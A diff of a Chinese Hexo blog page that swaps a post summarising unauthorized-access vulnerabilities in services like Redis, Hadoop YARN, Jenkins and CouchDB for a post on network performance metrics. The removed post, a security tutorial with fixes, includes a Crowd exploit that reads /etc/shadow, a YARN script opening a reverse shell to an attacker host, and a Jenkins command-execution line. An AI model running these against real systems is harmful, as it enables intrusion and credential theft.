@@ -126,13 +126,13 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">30</span>
+          <span class="site-state-item-count">41</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-count">2</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
   </nav>
@@ -162,7 +162,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/12/21/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/01/13/%E7%BD%91%E7%BB%9C%E6%80%A7%E8%83%BD%E6%8C%87%E6%A0%87/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/kilig.gif">
@@ -180,7 +180,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/12/21/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">未授权访问漏洞总结</a>
+          <a href="/2023/01/13/%E7%BD%91%E7%BB%9C%E6%80%A7%E8%83%BD%E6%8C%87%E6%A0%87/" class="post-title-link" itemprop="url">网络性能指标</a>
         </h2>
 
         <div class="post-meta-container">
@@ -191,14 +191,14 @@
       </span>
       <span class="post-meta-item-text">发表于</span>
 
-      <time title="创建时间：2022-12-21 15:41:16" itemprop="dateCreated datePublished" datetime="2022-12-21T15:41:16+08:00">2022-12-21</time>
+      <time title="创建时间：2023-01-13 11:28:31" itemprop="dateCreated datePublished" datetime="2023-01-13T11:28:31+08:00">2023-01-13</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-03-07 23:24:36" itemprop="dateModified" datetime="2023-03-07T23:24:36+08:00">2023-03-07</time>
+      <time title="修改时间：2023-03-08 12:52:48" itemprop="dateModified" datetime="2023-03-08T12:52:48+08:00">2023-03-08</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -206,7 +206,7 @@
       </span>
       <span class="post-meta-item-text">分类于</span>
         <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a>
+          <a href="/categories/%E7%BD%91%E7%BB%9C/" itemprop="url" rel="index"><span itemprop="name">网络</span></a>
         </span>
     </span>
 
@@ -220,987 +220,473 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h1 id="未授权访问漏洞总结"><a href="#未授权访问漏洞总结" class="headerlink" title="未授权访问漏洞总结"></a>未授权访问漏洞总结</h1><hr>
-<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>未授权访问漏洞可以理解为需要安全配置或权限认证的地址、授权页面存在缺陷导致其他用户可以直接访问从而引发重要权限可被操作、数据库或网站目录等敏感信息泄露。</p>
-<h2 id="0x01-未授权漏洞预览"><a href="#0x01-未授权漏洞预览" class="headerlink" title="0x01 未授权漏洞预览"></a>0x01 未授权漏洞预览</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">Active MQ 未授权访问</span><br><span class="line">Atlassian Crowd 未授权访问</span><br><span class="line">CouchDB 未授权访问</span><br><span class="line">Docker 未授权访问</span><br><span class="line">Dubbo 未授权访问</span><br><span class="line">Druid 未授权访问</span><br><span class="line">Elasticsearch 未授权访问</span><br><span class="line">FTP 未授权访问</span><br><span class="line">Hadoop 未授权访问</span><br><span class="line">JBoss 未授权访问</span><br><span class="line">Jenkins 未授权访问</span><br><span class="line">Jupyter Notebook 未授权访问</span><br><span class="line">Kibana 未授权访问</span><br><span class="line">Kubernetes Api Server 未授权访问</span><br><span class="line">LDAP 未授权访问</span><br><span class="line">MongoDB 未授权访问</span><br><span class="line">Memcached 未授权访问</span><br><span class="line">NFS 未授权访问</span><br><span class="line">Rsync 未授权访问</span><br><span class="line">Redis 未授权访问</span><br><span class="line">RabbitMQ 未授权访问</span><br><span class="line">Solr 未授权访问</span><br><span class="line">Spring Boot Actuator 未授权访问</span><br><span class="line">Spark 未授权访问</span><br><span class="line">VNC 未授权访问</span><br><span class="line">Weblogic 未授权访问</span><br><span class="line">ZooKeeper 未授权访问</span><br><span class="line">Zabbix 未授权访问</span><br></pre></td></tr></table></figure>
-
-<h2 id="0x02-Active-MQ-未授权访问"><a href="#0x02-Active-MQ-未授权访问" class="headerlink" title="0x02 Active MQ 未授权访问"></a>0x02 Active MQ 未授权访问</h2><h3 id="1-漏洞简介"><a href="#1-漏洞简介" class="headerlink" title="1. 漏洞简介"></a>1. 漏洞简介</h3><p>ActiveMQ是一款流行的开源消息服务器。默认情况下，ActiveMQ服务是没有配置安全参数。恶意人员可以利用默认配置弱点发动远程命令执行攻击，获取服务器权限，从而导致数据泄露。</p>
-<h3 id="2-漏洞检测"><a href="#2-漏洞检测" class="headerlink" title="2.漏洞检测"></a>2.漏洞检测</h3><p>默认端口：8161</p>
-<p>默认密码：admin&#x2F;admin</p>
-<p><img src="https://luckyseccloud.oss-cn-fuzhou.aliyuncs.com/picture/imgbed-master/posts/20201228114316.png" alt="img"></p>
-<h3 id="3-漏洞修复"><a href="#3-漏洞修复" class="headerlink" title="3.漏洞修复"></a>3.漏洞修复</h3><ul>
-<li>针对未授权访问，可修改conf&#x2F;jetty.xml文件，bean id为securityConstraint下的authenticate修改值为true，重启服务即可。</li>
-<li>针对弱口令，可修改conf&#x2F;jetty.xml文件，bean id 为securityLoginService下的conf值获取用户properties，修改用户名密码，重启服务即可。</li>
-</ul>
+          <h1 id="网络性能指标"><a href="#网络性能指标" class="headerlink" title="网络性能指标"></a>网络性能指标</h1><hr>
+<h2 id="速率与带宽"><a href="#速率与带宽" class="headerlink" title="速率与带宽"></a>速率与带宽</h2><p>比特（ bit）是计算机中数据量的单位，也是信息论中使用的信息量单位</p>
+<p>速率即为比特率（bit rate）是计算机网络中最重要的一个性能指标</p>
+<p>速率的单位是b&#x2F;s、Kb&#x2F;s 、Mb&#x2F;s、Gb&#x2F;s等</p>
+<p>带宽 1Bit&#x3D;8bit</p>
+<p><img src="https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20220106103830660.png" alt="image-20220106103830660"></p>
 <blockquote>
-<p>参考文章 <a target="_blank" rel="noopener" href="https://www.ouyangxiaoze.com/2020/08/631.html">https://www.ouyangxiaoze.com/2020/08/631.html</a></p>
+<p>常用的速率单位</p>
 </blockquote>
-<h2 id="0x03-Atlassian-Crowd-未授权访问"><a href="#0x03-Atlassian-Crowd-未授权访问" class="headerlink" title="0x03 Atlassian Crowd 未授权访问"></a>0x03 Atlassian Crowd 未授权访问</h2><h3 id="1-漏洞简介-1"><a href="#1-漏洞简介-1" class="headerlink" title="1.漏洞简介"></a>1.漏洞简介</h3><p>Atlassian Crowd是一套基于Web的单点登录系统。该系统为多用户、网络应用程序和目录服务器提供验证、授权等功能。Atlassian Crowd Data Center是Crowd的集群部署版。</p>
-<p>Atlassian Crowd和Crowd Data Center在其某些发行版本中错误地启用了pdkinstall开发插件，使其存在安全漏洞。攻击者利用该漏洞可在未授权访问的情况下对Atlassian Crowd和Crowd Data Center安装任意的恶意插件，执行任意代码&#x2F;命令，从而获得服务器权限。</p>
-<h3 id="2-漏洞检测-1"><a href="#2-漏洞检测-1" class="headerlink" title="2.漏洞检测"></a>2.漏洞检测</h3><p>漏洞利用脚本github地址：<a target="_blank" rel="noopener" href="https://github.com/jas502n/CVE-2019-11580">https://github.com/jas502n/CVE-2019-11580</a></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/jas502n/CVE-2019-11580</span><br><span class="line"><span class="built_in">cd</span> CVE-2019-11580/</span><br><span class="line">python CVE-2019-11580.py http://192.168.18.138:8095</span><br><span class="line">curl http://192.168.18.138:8095/crowd/plugins/servlet/exp?cmd=<span class="built_in">cat</span>%20/etc/shadow</span><br></pre></td></tr></table></figure>
-
-<h3 id="3-漏洞修复-1"><a href="#3-漏洞修复-1" class="headerlink" title="3.漏洞修复"></a>3.漏洞修复</h3><ul>
-<li>设置访问&#x2F;crowd&#x2F;admin&#x2F;uploadplugin.action的源ip。</li>
-<li>升级最新版本(3.5.0以上)。</li>
-</ul>
-<h2 id="0x04-CouchDB-未授权访问"><a href="#0x04-CouchDB-未授权访问" class="headerlink" title="0x04 CouchDB 未授权访问"></a>0x04 CouchDB 未授权访问</h2><h3 id="1-漏洞简介-2"><a href="#1-漏洞简介-2" class="headerlink" title="1.漏洞简介"></a>1.漏洞简介</h3><p>Apache CouchDB 是一个开源数据库，默认会在5984端口开放Restful的API接口，如果使用SSL的话就会监听在6984端口，用于数据库的管理功能。其HTTP Server默认开启时没有进行验证，而且绑定在0.0.0.0，所有用户均可通过API访问导致未授权访问。</p>
-<p>在官方配置文档中对HTTP Server的配置有WWW-Authenticate：Set this option to trigger basic-auth popup on unauthorized requests，但是很多用户都没有这么配置，导致漏洞产生。</p>
-<h3 id="2-漏洞检测-2"><a href="#2-漏洞检测-2" class="headerlink" title="2.漏洞检测"></a>2.漏洞检测</h3><p>使用vulhub搭建漏洞环境用于测试演示</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /vulhub/couchdb/CVE-2017-12636</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
-
-<p>未授权访问测试命令</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl 192.168.126.130:5984</span><br><span class="line">curl 192.168.126.130:5984/_config</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://luckyseccloud.oss-cn-fuzhou.aliyuncs.com/picture/imgbed-master/posts/20201228150444.png" alt="img"></p>
-<h3 id="3-漏洞修复-2"><a href="#3-漏洞修复-2" class="headerlink" title="3.漏洞修复"></a>3.漏洞修复</h3><ul>
-<li>指定CouchDB绑定的IP （需要重启CouchDB才能生效）在 &#x2F;etc&#x2F;couchdb&#x2F;local.ini 文件中找到 “bind_address &#x3D; 0.0.0.0” ，把 0.0.0.0 修改为 127.0.0.1 ，然后保存。<br>注：修改后只有本机才能访问CouchDB。</li>
-<li>设置访问密码（需要重启CouchDB才能生效）在 &#x2F;etc&#x2F;couchdb&#x2F;local.ini 中找到“[admins]”字段配置密码。</li>
-<li>设置WWW-Authenticate，强制认证。</li>
-</ul>
-<h2 id="0x05-Docker-未授权访问"><a href="#0x05-Docker-未授权访问" class="headerlink" title="0x05 Docker 未授权访问"></a>0x05 Docker 未授权访问</h2><h3 id="1-漏洞简介-3"><a href="#1-漏洞简介-3" class="headerlink" title="1.漏洞简介"></a>1.漏洞简介</h3><p>该未授权访问漏洞是因为Docker API可以执行Docker命令，该接口是目的是取代Docker命令界面，通过URL操作Docker。</p>
-<ul>
-<li><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/45905.html">Docker API 未授权访问漏洞分析和利用</a></li>
-</ul>
-<h3 id="2-漏洞检测-3"><a href="#2-漏洞检测-3" class="headerlink" title="2.漏洞检测"></a>2.漏洞检测</h3><p>使用vulhub搭建漏洞环境用于测试演示</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /vulhub/docker/unauthorized-rce</span><br><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
-
-<p>直接输入地址 <code>http://your-ip:2375/version</code> ；若能访问，证明存在未授权访问漏洞。</p>
-<p><img src="https://luckyseccloud.oss-cn-fuzhou.aliyuncs.com/picture/imgbed-master/posts/20200831092842.png" alt="img"></p>
-<h3 id="3-漏洞修复-3"><a href="#3-漏洞修复-3" class="headerlink" title="3.漏洞修复"></a>3.漏洞修复</h3><ul>
-<li>对2375端口做网络访问控制，如ACL控制，或者访问规则；</li>
-<li>修改docker swarm的认证方式，使用TLS认证；</li>
-</ul>
-<h2 id="0x06-Dubbo-未授权访问"><a href="#0x06-Dubbo-未授权访问" class="headerlink" title="0x06 Dubbo 未授权访问"></a>0x06 Dubbo 未授权访问</h2><h3 id="1-漏洞简介-4"><a href="#1-漏洞简介-4" class="headerlink" title="1.漏洞简介"></a>1.漏洞简介</h3><p>Dubbo是阿里巴巴公司开源的一个高性能优秀的 服务框架，使得应用可通过高性能的 RPC 实现服务的输 出和输入功能，可以和 Spring框架无缝集成。dubbo 因配置不当导致未授权访问漏洞。</p>
-<h3 id="2-漏洞检测-4"><a href="#2-漏洞检测-4" class="headerlink" title="2.漏洞检测"></a>2.漏洞检测</h3><p>连接进入dubbo 服务，进行操作</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telent IP port</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://luckyseccloud.oss-cn-fuzhou.aliyuncs.com/picture/imgbed-master/posts/20201228153747.png" alt="img"></p>
-<p><img src="https://luckyseccloud.oss-cn-fuzhou.aliyuncs.com/picture/imgbed-master/posts/20201228153816.png" alt="img"></p>
-<h3 id="3-漏洞修复-4"><a href="#3-漏洞修复-4" class="headerlink" title="3.漏洞修复"></a>3.漏洞修复</h3><ul>
-<li>配置dubbo认证；</li>
-<li>设置防火墙策略，限定IP访问；</li>
-</ul>
-<h2 id="0x07-Druid-未授权访问"><a href="#0x07-Druid-未授权访问" class="headerlink" title="0x07 Druid 未授权访问"></a>0x07 Druid 未授权访问</h2><h3 id="1-漏洞简介-5"><a href="#1-漏洞简介-5" class="headerlink" title="1.漏洞简介"></a>1.漏洞简介</h3><p>Druid是阿里巴巴数据库出品的，为监控而生的数据库连接池，并且Druid提供的监控功能，监控SQL的执行时间、监控Web URI的请求、Session监控，首先Druid是不存在什么漏洞的。但当开发者配置不当时就可能造成未授权访问。</p>
-<h3 id="2-漏洞检测-5"><a href="#2-漏洞检测-5" class="headerlink" title="2.漏洞检测"></a>2.漏洞检测</h3><p>直接在网站的url中后加上：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/druid/index.html</span><br><span class="line">/druid/websession.html</span><br><span class="line">/druid/datasource.html</span><br><span class="line">/druid/sql.html</span><br><span class="line">/druid/spring.html</span><br></pre></td></tr></table></figure>
-
-<p>如果可以无需登录，即可登录到Druid监控界面，则说明该网站存在Druid未授权访问漏洞</p>
-<p><img src="https://luckyseccloud.oss-cn-fuzhou.aliyuncs.com/picture/imgbed-master/posts/20201228155219.png" alt="img"></p>
-<h3 id="3-漏洞修复-5"><a href="#3-漏洞修复-5" class="headerlink" title="3.漏洞修复"></a>3.漏洞修复</h3><ul>
-<li>配置访问账号密码；</li>
-<li>禁止对外网开放访问；</li>
-</ul>
-<h2 id="0x08-Elasticsearch-未授权访问"><a href="#0x08-Elasticsearch-未授权访问" class="headerlink" title="0x08 Elasticsearch 未授权访问"></a>0x08 Elasticsearch 未授权访问</h2><h3 id="1-漏洞简介-6"><a href="#1-漏洞简介-6" class="headerlink" title="1.漏洞简介"></a>1.漏洞简介</h3><p>Elasticsearch是一款java编写的企业级搜索服务。越来越多的公司使用ELK作为日志分析，启动此服务默认会开放9200端口或者9300端口，可被非法操作数据。</p>
-<h3 id="2-漏洞检测-6"><a href="#2-漏洞检测-6" class="headerlink" title="2.漏洞检测"></a>2.漏洞检测</h3><p>未授权访问测试命令</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:9200/_cat/indices</span><br><span class="line">http://localhost:9200/_river/_search <span class="comment">#查看数据库敏感信息</span></span><br><span class="line">http://localhost:9200/_nodes <span class="comment">#查看节点数据</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://luckyseccloud.oss-cn-fuzhou.aliyuncs.com/picture/imgbed-master/posts/20201228161006.png" alt="img"></p>
-<h3 id="3-漏洞修复-6"><a href="#3-漏洞修复-6" class="headerlink" title="3.漏洞修复"></a>3.漏洞修复</h3><ul>
-<li>访问控制策略，限制IP访问，绑定固定IP；</li>
-<li>在config&#x2F;elasticsearch.yml中为9200端口设置认证等；</li>
-</ul>
-<h2 id="0x09-FTP-未授权访问"><a href="#0x09-FTP-未授权访问" class="headerlink" title="0x09 FTP 未授权访问"></a>0x09 FTP 未授权访问</h2><h3 id="1-漏洞简介-7"><a href="#1-漏洞简介-7" class="headerlink" title="1.漏洞简介"></a>1.漏洞简介</h3><p>FTP 弱口令或匿名登录漏洞，一般指使用 FTP 的用户启用了匿名登录功能，或系统口令的长度太短、复杂度不够、仅包含数字、或仅包含字母等，容易被黑客攻击，发生恶意文件上传或更严重的入侵行为。</p>
-<h3 id="2-漏洞检测-7"><a href="#2-漏洞检测-7" class="headerlink" title="2.漏洞检测"></a>2.漏洞检测</h3><p>直接访问ftp路径：<code>ftp://ip:port/</code></p>
-<p><img src="https://luckyseccloud.oss-cn-fuzhou.aliyuncs.com/picture/imgbed-master/posts/20201228222227.jpg" alt="img"></p>
-<h3 id="3-漏洞修复-7"><a href="#3-漏洞修复-7" class="headerlink" title="3.漏洞修复"></a>3.漏洞修复</h3><ul>
-<li>禁止匿名登录；</li>
-<li>配置强密码，密码长度建议八位以上，且密码应包括大小写字母、特殊字符、数字混合体；</li>
-</ul>
-<h2 id="0x10-HadoopYARN-未授权访问"><a href="#0x10-HadoopYARN-未授权访问" class="headerlink" title="0x10 HadoopYARN 未授权访问"></a>0x10 HadoopYARN 未授权访问</h2><h3 id="1-漏洞简介-8"><a href="#1-漏洞简介-8" class="headerlink" title="1.漏洞简介"></a>1.漏洞简介</h3><p>Hadoop是一款由Apache基金会推出的分布式系统框架，它通过著名的MapReduce算法进行分布式处理，Yarn是Hadoop集群的资源管理系统。</p>
-<p>此次事件主要因HadoopYARN资源管理系统配置不当，导致可以未经授权进行访问，从而被攻击者恶意利用。攻击者无需认证即可通过RESTAPI部署任务来执行任意指令，最终完全控制服务器。</p>
-<h3 id="2-漏洞检测-8"><a href="#2-漏洞检测-8" class="headerlink" title="2.漏洞检测"></a>2.漏洞检测</h3><p>使用vulhub搭建漏洞演示环境</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /vulhub/hadoop/unauthorized-yarn</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
-
-<p>环境启动后，没有配置身份认证，可以未授权访问到Hadoop YARN ResourceManager WebUI页面。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.126.130:8088/</span><br><span class="line">http://192.168.126.130:8088/cluster</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://luckyseccloud.oss-cn-fuzhou.aliyuncs.com/picture/imgbed-master/posts/20201228210305.png" alt="img"></p>
-<p>利用该漏洞，可以进一步getshell</p>
-<p><img src="https://luckyseccloud.oss-cn-fuzhou.aliyuncs.com/picture/imgbed-master/posts/20201228214152.png" alt="img"></p>
-<p>脚本源码如下：rce.py</p>
-<p>python</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">target = <span class="string">&#x27;http://192.168.126.130:8088/&#x27;</span> <span class="comment"># 设置目标主机的ip地址</span></span><br><span class="line">lhost = <span class="string">&#x27;192.168.126.128&#x27;</span> <span class="comment"># 设置你攻击主机的监听ip地址，并且监听端口为9999</span></span><br><span class="line"></span><br><span class="line">url = target + <span class="string">&#x27;ws/v1/cluster/apps/new-application&#x27;</span></span><br><span class="line">resp = requests.post(url)</span><br><span class="line">app_id = resp.json()[<span class="string">&#x27;application-id&#x27;</span>]</span><br><span class="line">url = target + <span class="string">&#x27;ws/v1/cluster/apps&#x27;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;application-id&#x27;</span>: app_id,</span><br><span class="line">    <span class="string">&#x27;application-name&#x27;</span>: <span class="string">&#x27;get-shell&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;am-container-spec&#x27;</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;commands&#x27;</span>: &#123;</span><br><span class="line">            <span class="string">&#x27;command&#x27;</span>: <span class="string">&#x27;/bin/  -i &gt;&amp; /dev/tcp/%s/9999 0&gt;&amp;1&#x27;</span> % lhost,</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&#x27;application-type&#x27;</span>: <span class="string">&#x27;YARN&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line">requests.post(url, json=data)</span><br></pre></td></tr></table></figure>
-
-<h3 id="3-漏洞修复-8"><a href="#3-漏洞修复-8" class="headerlink" title="3.漏洞修复"></a>3.漏洞修复</h3><ul>
-<li>升级Hadoop到2.x版本以上，并启用Kerberos认证功能，禁止匿名访问;</li>
-<li>设置“安全组”访问控制策略，将 Hadoop 默认开放的多个端口对公网全部禁止或限制可信任的 IP 地址才能访问包括 50070 以及 WebUI 等相关端口；</li>
-<li>如无必要，关闭 Hadoop Web 管理页面；</li>
-</ul>
-<h2 id="0x11-JBoss-未授权访问"><a href="#0x11-JBoss-未授权访问" class="headerlink" title="0x11 JBoss 未授权访问"></a>0x11 JBoss 未授权访问</h2><h3 id="1-漏洞简介-9"><a href="#1-漏洞简介-9" class="headerlink" title="1.漏洞简介"></a>1.漏洞简介</h3><p>漏洞简述JBOSS 企业应用平台EAP是 J2EE 应用的中间件平台。默认情况下访问 <code>http://ip:8080/jmx-console</code> 就可以浏览 Jboss 的部署管理的信息不需要输入用户名和密码可以直接部署上传木马有安全隐患。</p>
-<h3 id="2-漏洞检测-9"><a href="#2-漏洞检测-9" class="headerlink" title="2.漏洞检测"></a>2.漏洞检测</h3><p>直接访问 <code>http://ip:port/</code> 看是否能进入 jmx-console 和 web-console 页面</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://ip:8080/</span><br><span class="line">http://ip:8080/jmx-console/</span><br><span class="line">http://ip:8080/jbossws/</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://luckyseccloud.oss-cn-fuzhou.aliyuncs.com/picture/imgbed-master/posts/20201230142525.png" alt="img"></p>
-<h3 id="3-漏洞修复-9"><a href="#3-漏洞修复-9" class="headerlink" title="3.漏洞修复"></a>3.漏洞修复</h3><ul>
-<li>添加 JMX 控制页面身份认证；</li>
-<li>进行JMX Console 安全配置；</li>
-<li>关闭jmx-console和web-console;</li>
-</ul>
-<h2 id="0x12-Jenkins-未授权访问"><a href="#0x12-Jenkins-未授权访问" class="headerlink" title="0x12 Jenkins 未授权访问"></a>0x12 Jenkins 未授权访问</h2><h3 id="1-漏洞简介-10"><a href="#1-漏洞简介-10" class="headerlink" title="1.漏洞简介"></a>1.漏洞简介</h3><p>默认情况下Jenkins面板中用户可以选择执行脚本界面来操作一些系统层命令，攻击者可通过未授权访问漏洞或者暴力破解用户密码等进脚本执行界面从而获取服务器权限。</p>
-<h3 id="2-漏洞检测-10"><a href="#2-漏洞检测-10" class="headerlink" title="2.漏洞检测"></a>2.漏洞检测</h3><p>直接通过url输入以下地址，若能访问，证明存在未授权访问漏洞。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://&lt;target&gt;:8080/manage</span><br><span class="line">http://&lt;target&gt;:8080/script</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://luckyseccloud.oss-cn-fuzhou.aliyuncs.com/picture/imgbed-master/posts/20201228152520.png" alt="img"></p>
-<p>未授权访问 <code>http://&lt;target&gt;:8080/script</code> 可以执行系统命令</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 命令格式</span></span><br><span class="line">println <span class="string">&quot;whoami&quot;</span>.execute().text</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://luckyseccloud.oss-cn-fuzhou.aliyuncs.com/picture/imgbed-master/posts/20201228152707.png" alt="img"></p>
-<h3 id="3-漏洞修复-10"><a href="#3-漏洞修复-10" class="headerlink" title="3.漏洞修复"></a>3.漏洞修复</h3><ul>
-<li>对后台控制页面做登录验证限制；</li>
-<li>升级Jenkins至新版本；</li>
-<li>禁止把Jenkins直接暴露在公网；</li>
-</ul>
-<h2 id="0x13-Jupyter-Notebook-未授权访问"><a href="#0x13-Jupyter-Notebook-未授权访问" class="headerlink" title="0x13 Jupyter Notebook 未授权访问"></a>0x13 Jupyter Notebook 未授权访问</h2><h3 id="1-漏洞简介-11"><a href="#1-漏洞简介-11" class="headerlink" title="1.漏洞简介"></a>1.漏洞简介</h3><p>Jupyter Notebook（此前被称为 IPython notebook）是一个交互式笔记本，支持运行 40 多种编程语言。如果管理员未为Jupyter Notebook配置密码，将导致未授权访问漏洞，游客可在其中创建一个console并执行任意Python代码和命令。</p>
-<h3 id="2-漏洞检测-11"><a href="#2-漏洞检测-11" class="headerlink" title="2.漏洞检测"></a>2.漏洞检测</h3><p>使用vulhub搭建漏洞演示环境</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /vulhub/jupyter/notebook-rce</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
-
-<p>运行后，访问<code>http://your-ip:8888</code>将看到Jupyter Notebook的Web管理界面，并没有要求填写密码。</p>
-<p><img src="https://luckyseccloud.oss-cn-fuzhou.aliyuncs.com/picture/imgbed-master/posts/20201228235343.png" alt="img"></p>
-<p>选择 new -&gt; terminal 即可创建一个控制台：</p>
-<p><img src="https://luckyseccloud.oss-cn-fuzhou.aliyuncs.com/picture/imgbed-master/posts/20201228235711.png" alt="img"></p>
-<p>直接执行任意命令：</p>
-<p><img src="https://luckyseccloud.oss-cn-fuzhou.aliyuncs.com/picture/imgbed-master/posts/20201228235847.png" alt="img"></p>
-<h3 id="3-漏洞修复-11"><a href="#3-漏洞修复-11" class="headerlink" title="3.漏洞修复"></a>3.漏洞修复</h3><ul>
-<li>开启身份验证，防止未经授权用户访问；</li>
-<li>访问控制策略，限制IP访问，绑定固定IP；</li>
-</ul>
-<h2 id="0x14-Kibana-未授权访问"><a href="#0x14-Kibana-未授权访问" class="headerlink" title="0x14 Kibana 未授权访问"></a>0x14 Kibana 未授权访问</h2><h3 id="1-漏洞简介-12"><a href="#1-漏洞简介-12" class="headerlink" title="1.漏洞简介"></a>1.漏洞简介</h3><p>Kibana如果允许外网访问，没有做安全的登录认证，也会被外部随意访问查看所有的数据，造成少数据泄露。</p>
-<h3 id="2-漏洞检测-12"><a href="#2-漏洞检测-12" class="headerlink" title="2.漏洞检测"></a>2.漏洞检测</h3><p>直接访问kibana的页面</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.126.130:5601/</span><br><span class="line">https://192.168.126.130/app/kibana<span class="comment">#</span></span><br><span class="line">http://192.168.126.130:5601/app/kibana<span class="comment">#/</span></span><br></pre></td></tr></table></figure>
-
-<p>无需账号密码可以登录进入界面</p>
